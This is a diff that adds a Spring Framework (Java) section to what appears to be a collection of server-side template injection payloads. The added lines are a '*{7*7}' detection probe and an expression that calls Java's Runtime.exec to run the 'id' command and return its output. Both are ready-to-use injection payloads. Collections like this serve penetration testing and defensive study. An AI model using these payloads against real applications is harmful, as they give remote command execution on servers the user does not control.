@@ -879,6 +879,15 @@ Execute code using SSTI for Slim engine.
 
 ---
 
+## Spring Framework (Java)
+
+```
+*{7*7}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+```
+
+---
+
 ## Twig
 
 [Official website](https://twig.symfony.com/)
